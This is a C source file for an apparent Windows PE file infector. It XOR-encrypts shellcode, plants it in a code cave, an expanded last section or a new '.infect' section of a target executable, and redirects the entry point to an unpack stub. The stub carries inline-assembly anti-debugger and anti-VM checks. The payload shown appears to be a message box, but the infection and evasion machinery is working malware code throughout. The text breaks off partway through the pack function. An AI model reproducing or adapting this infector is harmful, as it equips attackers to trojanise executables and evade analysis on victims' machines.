#ifndef PACKER
#define PACKER
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include "utils.h"
#include "PEFile.h"
#include "code.h"

#ifndef DLL_NAME
#define DLL_NAME
#define MSVCRT_DLL_NAME "msvcrt.dll"
#define USER32_DLL_NAME "USER32.dll"
#define KERNEL32_DLL_NAME "KERNEL32.dll"
#endif

int unpack(){
    // Check Debug - 22 bytes
    __asm__(
        "xor %eax, %eax;"
        "xor %ebx, %ebx;"
        "mov %fs:0x30, %eax;"
        "movb 0x2(%eax), %bl;"
        "cmp $0, %ebx;"
        "jne RET + 5;"
    );

    // Check VM by CPUID - 15 bytes
    __asm__(
        "xor %eax, %eax;"
        "inc %eax;"
        "cpuid;"
        "bt $0x1f, %ecx;"
        "jc RET + 5;"
    );

    // Check VM by Brand - 33 bytes
    __asm__(
        "xor %eax, %eax;"
        "mov $0x40000000, %eax;"
        "cpuid;"
        "cmp $0x4D566572, %ecx;"
        "je RET + 5;"
        "cmp $0x65726177, %edx;"
        "je RET + 5;"
    );

    // These below values will be adjusted before infect to PE file
    UCHAR *StartOfShellCode = (UCHAR *) 0x1; 
    UINT SizeOfShellCode    = 0x2;

    DWORD PositionOfCaptionInShellCode = 0x3;
    DWORD PositionOfTextInShellCode    = 0x4;
    DWORD PositionOfDLLNameInShellCode = 0x5;

    DWORD PositionOfSetCaptionInShellcode  = 0x6;
    DWORD PositionOfSetTextInShellcode     = 0x7;
    DWORD PositionOfSetDLLNameInShellcode  = 0x8;
    DWORD PositionOfCallLoadLibInShellcode = 0x9;
    DWORD PositionOfCallGetProcInShellcode = 0xa;
    DWORD PositionOfJmpInShellCode         = 0xb;

    DWORD OldEntryPointVA = 0xc; 
    DWORD LoadLibraryVA   = 0xd; 
    DWORD GetProcVA       = 0xe;
    // These above values will be adjusted before infect to PE file

    UCHAR *msvcrtdll  = MSVCRT_DLL_NAME; 
    UCHAR *kerneldll  = KERNEL32_DLL_NAME;
    UCHAR VirtualAlloc_str[] = "VirtualAlloc";
    UCHAR VirtualProtect_str[] = "VirtualProtect";
    UCHAR memset_str[] = "memcpy";
    

    HMODULE hMSVCRT = LoadLibraryA(msvcrtdll);
    HMODULE hKERNEL = LoadLibraryA(kerneldll);                    
    LPVOID lpVirAlloc = GetProcAddress(hKERNEL, VirtualAlloc_str);
    LPVOID lpVirProtect = GetProcAddress(hKERNEL, VirtualProtect_str);
    LPVOID lpmemcpy = GetProcAddress(hMSVCRT, memset_str);    
    void *(*VirtualAlloc_ptr)(LPVOID, SIZE_T, DWORD, DWORD) = (void *(*)(LPVOID, SIZE_T, DWORD, DWORD)) lpVirAlloc;
    void *(*VirtualProtect_ptr)(LPVOID, SIZE_T, DWORD, PDWORD) = (void *(*)(LPVOID, SIZE_T, DWORD, PDWORD)) lpVirProtect;
    void *(*memcpy_ptr)(void *, void *, size_t) = (void *(*)(void *, void *, size_t))lpmemcpy;
    
    UCHAR *BufferOfShellcode = (UCHAR *)VirtualAlloc_ptr(NULL, SizeOfShellCode, MEM_COMMIT, PAGE_READWRITE);
    
    // Decrypt shellcode using XOR and put it into excutable memory
    for (int i = 0; i < SizeOfShellCode; i++)
        BufferOfShellcode[i] = StartOfShellCode[i] ^ 0xff;

    // Adjust all address in shellcode because the address of start of shellcode has been changed
    DWORD DLLNameAddress = (DWORD) BufferOfShellcode + PositionOfDLLNameInShellCode;
    DWORD CaptionAddress = (DWORD) BufferOfShellcode + PositionOfCaptionInShellCode;
    DWORD TextAddress    = (DWORD) BufferOfShellcode + PositionOfTextInShellCode;
    DWORD JmpVA          = (DWORD) BufferOfShellcode + PositionOfJmpInShellCode;
    long RelativeOfJmpAndOldEntryPoint = (long) OldEntryPointVA - JmpVA - 5;

    // Putting adjusted address into their memory
    memcpy_ptr(&BufferOfShellcode[PositionOfCallLoadLibInShellcode + 2], &LoadLibraryVA, 4);
    memcpy_ptr(&BufferOfShellcode[PositionOfCallGetProcInShellcode + 2], &GetProcVA, 4);
    memcpy_ptr(&BufferOfShellcode[PositionOfSetDLLNameInShellcode + 3], &DLLNameAddress, 4);
    memcpy_ptr(&BufferOfShellcode[PositionOfSetCaptionInShellcode + 3], &CaptionAddress, 4);
    memcpy_ptr(&BufferOfShellcode[PositionOfSetTextInShellcode + 3], &TextAddress, 4);
    memcpy_ptr(&BufferOfShellcode[PositionOfJmpInShellCode + 1], &RelativeOfJmpAndOldEntryPoint, 4);
    
    DWORD dummy;
    VirtualProtect_ptr(BufferOfShellcode, SizeOfShellCode, PAGE_EXECUTE_READ, &dummy);

    void (*FunctionPtr)(void) = (void (*)(void)) BufferOfShellcode;
    FunctionPtr();

    __asm__(
        "RET:"
        "jmp 0x12345678;" // Place hold jmp instruction
    );
    return 0;
}

int endunpack(){
    // position of end of unpack function
}

typedef struct _SHELL_CODE_PARAM{
    DWORD PositionOfSetDLLName;
    DWORD PositionOfCallLibrary;
    DWORD PositionOfCallGetProc;
    DWORD PositionOfSetCaption;
    DWORD PositionOfSetText;
    DWORD PositionOfJmp;
    DWORD PositionOfMesBoxVersion;
    UCHAR *Caption;
    UCHAR *Text;
    DWORD Size;
    DWORD VirtualAddress;
    DWORD PositionOfCaptionA;
    DWORD PositionOfTextA;
    DWORD PositionOfDLLNameA;
    DWORD PositionOfCaptionW;
    DWORD PositionOfTextW;
    DWORD PositionOfDLLNameW;
} SHELL_CODE_PARAM, *PSHELL_CODE_PARAM;

typedef struct _UNPACK_CODE_PARAM{
    DWORD PosOfSetStartOfShellAddr;
    DWORD PosOfSetSizeOfShellAddr;

    DWORD PosOfSetPosOfCap;
    DWORD PosOfSetPosOfText;
    DWORD PosOfSetPosOfDLLName;
        
    DWORD PosOfSetPosOfSetCap;
    DWORD PosOfSetPosOfSetText;
    DWORD PosOfSetPosOfSetDLLName;
    DWORD PosOfSetPosOfCallLoadLib;
    DWORD PosOfSetPosOfCallGetProc;
    DWORD PosOfSetPosOfJmp;

    DWORD PosOfSetOEP;
    DWORD PosOfSetLoadLibVA;
    DWORD PosOfSetGetProcVA;
    DWORD PosOfSetMSVCRTDLLName;
    DWORD PosOfSetKERNELDLLName;

    DWORD PosOfCallLoadLibMSVCRT;
    DWORD PosOfCallLoadLibKERNEL;
    DWORD PosOfCallGetProcVirAlloc;
    DWORD PosOfCallGetProcVirProtect;
    DWORD PosOfCallGetProcMemcpy;

    DWORD PositionOfMSVCRTDLLNameA;
    DWORD PositionOfMSVCRTDLLNameW;
    DWORD PositionOfKERNELDLLNameA;
    DWORD PositionOfKERNELDLLNameW;

    DWORD PositionOfJmp;
    DWORD Size;
} UNPACK_CODE_PARAM, *PUNPACK_CODE_PARAM;


int adjustShellCode(UCHAR *FileName, UCHAR *NewFileName, int Mode, char MesBoxVersion, PSHELL_CODE_PARAM ShellParam){
    /*
     * ADJUST SHELLCODE:
     *      + Change relative call (5 bytes) to direct call (6 bytes)
     *      + Put string to shellcode
     *      + Adjust position of address and string in shellcode
     */

    FILE *FinHandle;
    FILE *FouHandle;
    UCHAR CurrentInputFileName[0xff];
    UCHAR tmpOutFileName[0xff];
    
    // Copy current file to tmp file
    itoa(rand() * rand(), CurrentInputFileName, 10);
    FinHandle = fopen(FileName, "rb");
    FouHandle = fopen(CurrentInputFileName, "wb");
    copyFile(FouHandle, FinHandle, 0xff);
    fclose(FinHandle);
    fclose(FouHandle);

    printf("\tCalculating shellcode size and position of important instructions...\n");
    DWORD nBytesOfPlaceHold = 0x10;
    ShellParam->PositionOfCaptionA = 
        (int) endStableCode - (int) stableCode  // Size of display messagebox code
        + nBytesOfPlaceHold;
    ShellParam->PositionOfTextA   = ShellParam->PositionOfCaptionA + strlen(ShellParam->Caption) + 1;
    ShellParam->PositionOfDLLNameA= ShellParam->PositionOfTextA    + strlen(ShellParam->Text) + 1;
    
    ShellParam->PositionOfCaptionW = ShellParam->PositionOfDLLNameA + strlen(USER32_DLL_NAME) + 1;
    ShellParam->PositionOfTextW    = ShellParam->PositionOfCaptionW + strlen(ShellParam->Caption) * 2 + 2;
    ShellParam->PositionOfDLLNameW = ShellParam->PositionOfTextW    + strlen(ShellParam->Text) * 2 + 2;
    
    ShellParam->Size = ShellParam->PositionOfDLLNameW + strlen(USER32_DLL_NAME) * 2 + 2 + 0x10;

    // Create a shellcode writable memory to adjust it
    UCHAR *ShellCode = (UCHAR *) malloc(ShellParam->Size);
    memset(ShellCode, 0, ShellParam->Size);
    memcpy(ShellCode, stableCode, (int) endStableCode - (int) stableCode);

    // Set Mesbox version
    memset(ShellCode + ShellParam->PositionOfMesBoxVersion, MesBoxVersion, 1);

    printf("\tAdjusting some instructions and put string to shellcode...\n");
    // Adjust call instructions
    memDel(ShellCode, ShellParam->Size, ShellParam->PositionOfCallLibrary, 5);
    memIns(ShellCode, ShellParam->Size, "\xff\x15\x11\x22\x33\x44", 6, ShellParam->PositionOfCallLibrary);
    ShellParam->PositionOfCallGetProc += 1;
    ShellParam->PositionOfSetCaption += 1;
    ShellParam->PositionOfSetText += 1;
    ShellParam->PositionOfJmp += 1;
    ShellParam->PositionOfMesBoxVersion += 1;

    memDel(ShellCode, ShellParam->Size, ShellParam->PositionOfCallGetProc, 5);
    memIns(ShellCode, ShellParam->Size, "\xff\x15\x11\x22\x33\x44", 6, ShellParam->PositionOfCallGetProc);
    ShellParam->PositionOfSetCaption += 1;
    ShellParam->PositionOfSetText += 1;
    ShellParam->PositionOfJmp += 1;
     
    // Put CaptionA, TextA and DLLNameA into ShellCode
    // + 1 for a null-terminal byte in string
    memcpy(ShellCode + ShellParam->PositionOfCaptionA, ShellParam->Caption, strlen(ShellParam->Caption) + 1); 
    memcpy(ShellCode + ShellParam->PositionOfTextA, ShellParam->Text, strlen(ShellParam->Text) + 1);
    memcpy(ShellCode + ShellParam->PositionOfDLLNameA, USER32_DLL_NAME, strlen(USER32_DLL_NAME) + 1);

    // Put CaptionW, TextW and DLLNameW into ShellCode
    // + 2 for 2 null-terminal bytes in string
    WCHAR CaptionW[0xff], TextW[0xff], DLLNameW[0x20];
    char2Wchar(ShellParam->Caption, CaptionW);
    char2Wchar(ShellParam->Text, TextW);
    char2Wchar(USER32_DLL_NAME, DLLNameW);
    memcpy(ShellCode + ShellParam->PositionOfCaptionW, CaptionW, strlen(ShellParam->Caption) * 2 + 2); 
    memcpy(ShellCode + ShellParam->PositionOfTextW, TextW, strlen(ShellParam->Text) * 2 + 2);
    memcpy(ShellCode + ShellParam->PositionOfDLLNameW, DLLNameW, strlen(USER32_DLL_NAME) * 2 + 2);

    printf("\tEncrypt shellcode with xor...\n");
    // Encrypt shellcode
    for (int i = 0; i < ShellParam->Size; i++)
        ShellCode[i] = ShellCode[i] ^ 0xff;

    /*
     * READ PEFILE HEADER TO EXTRACT ITS INFORMATION
     */
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeaders;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    FinHandle = fopen(CurrentInputFileName, "rb");
    readPE32Header(FinHandle, &DOSHeader, &NTHeaders, SectionHeaders);
    fclose(FinHandle);

    
    /*
     * FIND A CODE CAVE TO PUT SHELLCODE INTO IT
     * BECAUSE'S OF SIMPLITY, IGNORE OTHERS MODE (ADD_EMPTY_SECTION AND EXPAND_LAST_SECTION)
     */
    
    IMAGE_SECTION_HEADER WhereSection; // Section which will be infected with shellcode
    DWORD Length;   // Length of code cave
    DWORD OffsetOfShellCode;

    FinHandle = fopen(CurrentInputFileName, "rb");
    if (Mode == 0) {
        printf("\tUsing mode find code cave\n");
        OffsetOfShellCode = findOffsetOfCodeCave(FinHandle, &WhereSection, &Length);
        fclose(FinHandle);
    }
    else if (Mode == 1) {
        printf("\tUsing mode expand last section\n");

        itoa(rand() * rand(), tmpOutFileName, 10);
        FouHandle = fopen(tmpOutFileName, "wb");

        OffsetOfShellCode = expandLastSection(FinHandle, FouHandle, 0x1000, 0);
        Length = 0x1000;
        WhereSection = SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1];

        fclose(FinHandle);
        fclose(FouHandle);

        remove(CurrentInputFileName);
        strcpy(CurrentInputFileName, tmpOutFileName);
    }
    else if (Mode == 2) {
        printf("\tUsing mode add a section\n");
        itoa(rand() * rand(), tmpOutFileName, 10);

        FouHandle = fopen(tmpOutFileName, "wb");
        OffsetOfShellCode = addEmptySection(FinHandle, FouHandle, ".infect", 0x1000, 0);
        
        fclose(FinHandle);
        fclose(FouHandle);

        remove(CurrentInputFileName);
        strcpy(CurrentInputFileName, tmpOutFileName);

        IMAGE_DOS_HEADER DOSHeader;
        IMAGE_NT_HEADERS32 NTHeaders;
        IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
        FILE *tmpF = fopen(CurrentInputFileName, "rb");
        readPE32Header(tmpF, &DOSHeader, &NTHeaders, SectionHeaders);
        fclose(tmpF);

        WhereSection = SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1];
        Length = WhereSection.SizeOfRawData;
    }
    else{
        printf("Invalid Mode 1. Find code cave  2. expand last section  3. add a section\n");
        free(ShellCode);
        remove(CurrentInputFileName);
        exit(1);
    }

    if (Length < ShellParam->Size){
        printf("\tNot enough memory to infect shellcode\n");
        free(ShellCode);
        return 1;
    }

    ShellParam->VirtualAddress =
        OffsetOfShellCode 
        - WhereSection.PointerToRawData 
        + WhereSection.VirtualAddress
        + NTHeaders.OptionalHeader.ImageBase;
    printf("\tCode cave found\n");
    printf("\t\tShell code Offset: 0x%x\tLength: %d\n", OffsetOfShellCode, Length);
    printf("\t\tShell code RVA   : 0x%x\n", ShellParam->VirtualAddress);

    // Put shellcode to codecave
    FinHandle = fopen(CurrentInputFileName, "rb");
    FouHandle = fopen(NewFileName, "wb");
    infectShellcode(FinHandle, FouHandle, ShellCode, ShellParam->Size, OffsetOfShellCode);
    fclose(FinHandle);
    fclose(FouHandle);
    free(ShellCode);
    remove(CurrentInputFileName);
    printf("\tInfecting shellcode successfully~~\n");
}

int adjustUnpack(
    UCHAR *FileName, 
    UCHAR *NewFileName, 
    char MesBoxVersion, 
    SHELL_CODE_PARAM ShellParam, 
    PUNPACK_CODE_PARAM UnpackParam
){
    FILE *FinHandle;
    FILE *FouHandle;
    UCHAR CurrentInputFileName[0xff];
    UCHAR tmpOutFileName[0xff];
    
    // Copy current file to tmp file
    itoa(rand() * rand(), CurrentInputFileName, 10);
    FinHandle = fopen(FileName, "rb");
    FouHandle = fopen(CurrentInputFileName, "wb");
    copyFile(FouHandle, FinHandle, 0xff);
    fclose(FinHandle);
    fclose(FouHandle);
    
    /*
     * READ PEFILE HEADER TO EXTRACT ITS INFORMATION
     */
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeaders;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];

    FinHandle = fopen(CurrentInputFileName, "rb");
    readPE32Header(FinHandle, &DOSHeader, &NTHeaders, SectionHeaders);
    fclose(FinHandle);
    /*
     * ADJUST UNPACK SHELLCODE:
     *      + Change relative call (5 bytes) to direct call (6 bytes)
     *      + Put string to shellcode
     *      + Adjust position of address and string in shellcode
     *      + Adjust values of some variable
     */
    printf("\tCalculating size and position of important instruction...\n");
    DWORD nBytesOfPlaceHold = 0x20;
    UnpackParam->PositionOfMSVCRTDLLNameA = 
        (int) endunpack - (int) unpack // Size of unpack code
        + nBytesOfPlaceHold;
    UnpackParam->PositionOfMSVCRTDLLNameW = 
        UnpackParam->PositionOfMSVCRTDLLNameA 
        + strlen(MSVCRT_DLL_NAME) 
        + 1;

    UnpackParam->PositionOfKERNELDLLNameA =
        UnpackParam->PositionOfMSVCRTDLLNameW
        + strlen(MSVCRT_DLL_NAME) * 2
        + 2;
    UnpackParam->PositionOfKERNELDLLNameW =
        UnpackParam->PositionOfKERNELDLLNameA
        + strlen(KERNEL32_DLL_NAME)
        + 1;

    UnpackParam->Size = 
        UnpackParam->PositionOfKERNELDLLNameW
        + strlen(KERNEL32_DLL_NAME) * 2 
        + 2
        + nBytesOfPlaceHold;

    UCHAR *UnpackShellCode = (UCHAR *) malloc(UnpackParam->Size);
    memset(UnpackShellCode, 0, UnpackParam->Size);
    memcpy(UnpackShellCode, unpack, (int) endunpack - (int) unpack);

    DWORD OldEntryPoint = NTHeaders.OptionalHeader.AddressOfEntryPoint + NTHeaders.OptionalHeader.ImageBase;

    printf("\tFinding function LoadLibrary and GetProcAddress in PE File...\n");
    FinHandle = fopen(CurrentInputFileName, "rb");
    DWORD LoadLibraryAddress;
    DWORD LoadLibraryAAddress = findFuncAddressByName(FinHandle, KERNEL32_DLL_NAME, "LoadLibraryA");
    DWORD LoadLibraryWAddress = findFuncAddressByName(FinHandle, KERNEL32_DLL_NAME, "LoadLibraryW");
    DWORD GetProcAddress = findFuncAddressByName(FinHandle, KERNEL32_DLL_NAME, "GetProcAddress");
    fclose(FinHandle);

    DWORD PositionOfDLLNameInShellCode;
    if (LoadLibraryAAddress){
        PositionOfDLLNameInShellCode = ShellParam.PositionOfDLLNameA;
        LoadLibraryAddress = LoadLibraryAAddress;
    }
    else if (LoadLibraryWAddress){
        PositionOfDLLNameInShellCode = ShellParam.PositionOfDLLNameW;
        LoadLibraryAddress = LoadLibraryWAddress;
    }
    else{
        printf("\tNo function found\n");
        free(UnpackShellCode);
        remove(CurrentInputFileName);
        return 1;
    }
    printf("\t\tRVA Of LoadLibrary: 0x%x\n", LoadLibraryAddress);
    printf("\t\tRVA Of GetProcAddress: 0x%x\n", GetProcAddress);

    DWORD PositionOfCaptionInShellCode;
    DWORD PositionOfTextInShellCode;
    printf("\tUsing Message Box version %c\n", MesBoxVersion);
    if (MesBoxVersion == 'A'){
        PositionOfCaptionInShellCode = ShellParam.PositionOfCaptionA;
        PositionOfTextInShellCode = ShellParam.PositionOfTextA;
    }
    else{
        PositionOfCaptionInShellCode = ShellParam.PositionOfCaptionW;
        PositionOfTextInShellCode = ShellParam.PositionOfTextW;
    }

    printf("\tAdjusting some instruction and put string to unpack shellcode...\n");
    char CallLoadLibInstruction[6] = {0xff, 0x15, 0x11, 0x22, 0x33, 0x44};
    char CallGetProcInstruction[6] = {0xff, 0x15, 0x11, 0x22, 0x33, 0x44};
    DWORD2AddressAsShellcode(LoadLibraryAddress, CallLoadLibInstruction + 2);
    DWORD2AddressAsShellcode(GetProcAddress, CallGetProcInstruction + 2);

    memcpy(UnpackShellCode + UnpackParam->PosOfSetStartOfShellAddr + 3, &ShellParam.VirtualAddress, 4);
    memcpy(UnpackShellCode + UnpackParam->PosOfSetSizeOfShellAddr + 3, &ShellParam.Size, 4);
    
    // MessageBoxA is always used to display. Ignore MessageBoxW for simplity
    memcpy(UnpackShellCode + UnpackParam->PosOfSetPosOfCap + 3, &PositionOfCaptionInShellCode, 4); 
    memcpy(UnpackShellCode + UnpackParam->PosOfSetPosOfText + 3, &PositionOfTextInShellCode, 4);
    memcpy(UnpackShellCode + UnpackParam->PosOfSetPosOfDLLName + 3, &PositionOfDLLNameInShellCode, 4);
    
    memcpy(UnpackShellCode + UnpackParam->PosOfSetPosOfSetCap + 3, &ShellParam.PositionOfSetCaption, 4);
    memcpy(UnpackShellCode + UnpackParam->PosOfSetPosOfSetText + 3, &ShellParam.PositionOfSetText, 4);
    memcpy(UnpackShellCode + UnpackParam->PosOfSetPosOfSetDLLName + 3, &ShellParam.PositionOfSetDLLName, 4);
    memcpy(UnpackShellCode + UnpackParam->PosOfSetPosOfCallLoadLib + 3, &ShellParam.PositionOfCallLibrary, 4);
    memcpy(UnpackShellCode + UnpackParam->PosOfSetPosOfCallGetProc + 3, &ShellParam.PositionOfCallGetProc, 4);
    memcpy(UnpackShellCode + UnpackParam->PosOfSetPosOfJmp + 3, &ShellParam.PositionOfJmp, 4);

    memcpy(UnpackShellCode + UnpackParam->PosOfSetLoadLibVA + 3, &LoadLibraryAddress, 4);
    memcpy(UnpackShellCode + UnpackParam->PosOfSetGetProcVA + 3, &GetProcAddress, 4);
    memcpy(UnpackShellCode + UnpackParam->PosOfSetOEP + 3, &OldEntryPoint, 4);

    memDel(UnpackShellCode, UnpackParam->Size, UnpackParam->PosOfCallLoadLibMSVCRT, 5);
    memIns(UnpackShellCode, UnpackParam->Size, CallLoadLibInstruction, 6, UnpackParam->PosOfCallLoadLibMSVCRT);
    UnpackParam->PosOfCallLoadLibKERNEL++;
    UnpackParam->PosOfCallGetProcVirAlloc++;
    UnpackParam->PosOfCallGetProcVirProtect++;
    UnpackParam->PosOfCallGetProcMemcpy++;
    UnpackParam->PositionOfMSVCRTDLLNameA++;
    UnpackParam->PositionOfMSVCRTDLLNameW++;
    UnpackParam->PositionOfKERNELDLLNameA++;
    UnpackParam->PositionOfKERNELDLLNameW++;
    UnpackParam->PositionOfJmp++;

    memDel(UnpackShellCode, UnpackParam->Size, UnpackParam->PosOfCallLoadLibKERNEL, 5);
    memIns(UnpackShellCode, UnpackParam->Size, CallLoadLibInstruction, 6, UnpackParam->PosOfCallLoadLibKERNEL);
    UnpackParam->PosOfCallGetProcVirAlloc++;
    UnpackParam->PosOfCallGetProcVirProtect++;
    UnpackParam->PosOfCallGetProcMemcpy++;
    UnpackParam->PositionOfMSVCRTDLLNameA++;
    UnpackParam->PositionOfMSVCRTDLLNameW++;
    UnpackParam->PositionOfKERNELDLLNameA++;
    UnpackParam->PositionOfKERNELDLLNameW++;
    UnpackParam->PositionOfJmp++;

    memDel(UnpackShellCode, UnpackParam->Size, UnpackParam->PosOfCallGetProcVirAlloc, 5);
    memIns(UnpackShellCode, UnpackParam->Size, CallGetProcInstruction, 6, UnpackParam->PosOfCallGetProcVirAlloc);
    UnpackParam->PosOfCallGetProcVirProtect++;
    UnpackParam->PosOfCallGetProcMemcpy++;
    UnpackParam->PositionOfMSVCRTDLLNameA++;
    UnpackParam->PositionOfMSVCRTDLLNameW++;
    UnpackParam->PositionOfKERNELDLLNameA++;
    UnpackParam->PositionOfKERNELDLLNameW++;
    UnpackParam->PositionOfJmp++;

    memDel(UnpackShellCode, UnpackParam->Size, UnpackParam->PosOfCallGetProcVirProtect, 5);
    memIns(UnpackShellCode, UnpackParam->Size, CallGetProcInstruction, 6, UnpackParam->PosOfCallGetProcVirProtect);
    UnpackParam->PosOfCallGetProcMemcpy++;
    UnpackParam->PositionOfMSVCRTDLLNameA++;
    UnpackParam->PositionOfMSVCRTDLLNameW++;
    UnpackParam->PositionOfKERNELDLLNameA++;
    UnpackParam->PositionOfKERNELDLLNameW++;
    UnpackParam->PositionOfJmp++;

    memDel(UnpackShellCode, UnpackParam->Size, UnpackParam->PosOfCallGetProcMemcpy, 5);
    memIns(UnpackShellCode, UnpackParam->Size, CallGetProcInstruction, 6, UnpackParam->PosOfCallGetProcMemcpy);
    UnpackParam->PositionOfMSVCRTDLLNameA++;
    UnpackParam->PositionOfMSVCRTDLLNameW++;
    UnpackParam->PositionOfKERNELDLLNameA++;
    UnpackParam->PositionOfKERNELDLLNameW++;
    UnpackParam->PositionOfJmp++;

    /*
     * FIND A CODE CAVE TO PUT UNPACK CODE INTO IT
     * BECAUSE'S OF SIMPLITY, IGNORE OTHERS MODE (ADD_EMPTY_SECTION AND EXPAND_LAST_SECTION)
     */
    printf("\tFind code cave in PE File for unpack shellcode...\n");
    IMAGE_SECTION_HEADER WhereSection;
    DWORD Length;
    DWORD OffsetOfUnpackShellCode;
    FinHandle = fopen(CurrentInputFileName, "rb");
    OffsetOfUnpackShellCode = findOffsetOfCodeCave(FinHandle, &WhereSection, &Length);
    fclose(FinHandle);

    if (Length < UnpackParam->Size){
        printf("\tNot enough memory to infect unpack shellcode\n");
        free(UnpackShellCode);
        remove(CurrentInputFileName);
        return 1;
    }
    DWORD UnpackShellCodeRVA = OffsetOfUnpackShellCode - WhereSection.PointerToRawData + WhereSection.VirtualAddress;
    printf("\tCode cave found\n");
    printf("\t\tUnpack Offset: 0x%x\tLength: %d\n", OffsetOfUnpackShellCode, Length);
    printf("\t\tUnpack RVA: 0x%x\n", UnpackShellCodeRVA);

    DWORD RVAOfJmp = 
        OffsetOfUnpackShellCode 
        + UnpackParam->PositionOfJmp 
        - WhereSection.PointerToRawData 
        + WhereSection.VirtualAddress;
    DWORD RelativeAddressFromJmp = OldEntryPoint - RVAOfJmp - 5 - NTHeaders.OptionalHeader.ImageBase;
    memcpy(UnpackShellCode + UnpackParam->PositionOfJmp + 1, &RelativeAddressFromJmp, 4);
    
    DWORD PositionOfMSVCRTDLLNameInUnpack;
    DWORD PositionOfKERNELDLLNameInUnpack;
    if (LoadLibraryAAddress){
        PositionOfMSVCRTDLLNameInUnpack = UnpackParam->PositionOfMSVCRTDLLNameA;
        PositionOfKERNELDLLNameInUnpack = UnpackParam->PositionOfKERNELDLLNameA;
    }
    else if (LoadLibraryWAddress) {
        PositionOfMSVCRTDLLNameInUnpack = UnpackParam->PositionOfMSVCRTDLLNameW;
        PositionOfKERNELDLLNameInUnpack = UnpackParam->PositionOfKERNELDLLNameW;
    }

    DWORD MSVCRTDLLNameInUnpackVA = 
        OffsetOfUnpackShellCode + PositionOfMSVCRTDLLNameInUnpack
        - WhereSection.PointerToRawData + WhereSection.VirtualAddress
        + NTHeaders.OptionalHeader.ImageBase;
    
    DWORD KERNELDLLNameInUnpackVA = 
        OffsetOfUnpackShellCode + PositionOfKERNELDLLNameInUnpack
        - WhereSection.PointerToRawData + WhereSection.VirtualAddress
        + NTHeaders.OptionalHeader.ImageBase;
    
    memcpy(UnpackShellCode + UnpackParam->PosOfSetMSVCRTDLLName + 3, &MSVCRTDLLNameInUnpackVA, 4);
    memcpy(UnpackShellCode + UnpackParam->PosOfSetKERNELDLLName + 3, &KERNELDLLNameInUnpackVA, 4);
    
    memcpy(UnpackShellCode + UnpackParam->PositionOfMSVCRTDLLNameA, MSVCRT_DLL_NAME, strlen(MSVCRT_DLL_NAME) + 1);
    memcpy(UnpackShellCode + UnpackParam->PositionOfKERNELDLLNameA, KERNEL32_DLL_NAME, strlen(KERNEL32_DLL_NAME) + 1);
    
    
    WCHAR MSVCRT_DLL_NAMEW[0x20];
    WCHAR KERNEL_DLL_NAMEW[0x20];
    char2Wchar(MSVCRT_DLL_NAME, MSVCRT_DLL_NAMEW);
    char2Wchar(KERNEL32_DLL_NAME, KERNEL_DLL_NAMEW);
    memcpy(UnpackShellCode + UnpackParam->PositionOfMSVCRTDLLNameW, MSVCRT_DLL_NAMEW, strlen(MSVCRT_DLL_NAME) * 2 + 2);
    memcpy(UnpackShellCode + UnpackParam->PositionOfKERNELDLLNameW, KERNEL_DLL_NAMEW, strlen(KERNEL32_DLL_NAME) * 2 + 2);

    printf("\tAdjust Entry Point...\n");
    itoa(rand() * rand(), tmpOutFileName, 10);
    FinHandle = fopen(CurrentInputFileName, "rb");
    FouHandle = fopen(tmpOutFileName, "wb");
    adjustEntryPoint(FinHandle, FouHandle, OffsetOfUnpackShellCode);
    fclose(FouHandle);
    fclose(FinHandle);
    remove(CurrentInputFileName);
    strcpy(CurrentInputFileName, tmpOutFileName);

    printf("\tInfecting unpack shellcode to PE File...\n");
    // Put shellcode to codecave
    itoa(rand() * rand(), tmpOutFileName, 10);
    FinHandle = fopen(CurrentInputFileName, "rb");
    FouHandle = fopen(tmpOutFileName, "wb");
    infectShellcode(FinHandle, FouHandle, UnpackShellCode, UnpackParam->Size, OffsetOfUnpackShellCode);
    
    fclose(FouHandle);
    fclose(FinHandle);
    remove(CurrentInputFileName);
    strcpy(CurrentInputFileName, tmpOutFileName);
    free(UnpackShellCode);
    
    FinHandle = fopen(CurrentInputFileName, "rb");
    FouHandle = fopen(NewFileName, "wb");
    copyFile(FouHandle, FinHandle, 0xfff);
    fclose(FinHandle);
    fclose(FouHandle);
    remove(CurrentInputFileName);
    printf("\tInfecting unpack shellcode successfully~~\n");
    return 0;
}

int pack(UCHAR *FileName, UCHAR *NewFileName, int Mode, char MesBoxVersion){  
    FILE *FinHandle;
    FILE *FouHandle;
    UCHAR CurrentInputFileName[0xff];
    UCHAR tmpOutFileName[0xff];
    
    // Copy current file to tmp file
    itoa(rand() * rand(), CurrentInputFileName, 10);
    FinHandle = fopen(FileName, "rb");
    FouHandle = fopen(CurrentInputFileName, "wb");
    copyFile(FouHandle, FinHandle, 0xff);
    fclose(FinHandle);
    fclose(FouHandle);
    
    /*
     * READ PEFILE HEADER TO EXTRACT ITS INFORMATION
     */
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeaders;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];

    FinHandle = fopen(CurrentInputFileName, "rb");
    readPE32Header(FinHandle, &DOSHeader, &NTHeaders, SectionHeaders);
    fclose(FinHandle);

    printf("Checking Base Relocation Table...\n");
    IMAGE_SECTION_HEADER WhereSection;
    if (checkBaseRelocation(NTHeaders.OptionalHeader, SectionHeaders, &WhereSection) == 1){
        printf("\tPE File has base relocation, deleting them...\n");
        itoa(rand() * rand(), tmpOutFileName, 10);
        FinHandle = fopen(CurrentInputFileName, "rb");
        FouHandle = fopen(tmpOutFileName, "wb");
        adjustBaseRelocation(
            FinHandle, 
            FouHandle, 
            WhereSection
        );
        fclose(FouHandle);
        fclose(FinHandle);
        remove(CurrentInputFileName);
        strcpy(CurrentInputFileName, tmpOutFileName);
    }

    printf("Generating shellcode...\n");
    SHELL_CODE_PARAM ShellParam;
    memset(&ShellParam, 0, sizeof(SHELL_CODE_PARAM));

    ShellParam.PositionOfSetDLLName    = POS_SET_DLLNAME_STABLE;
    ShellParam.PositionOfCallLibrary   = POS_CALL_LOAD_STABLE;
    ShellParam.PositionOfCallGetProc   = POS_CALL_GET_PROC_STABLE;
    ShellParam.PositionOfSetCaption    = POS_SET_CAP_STABLE;
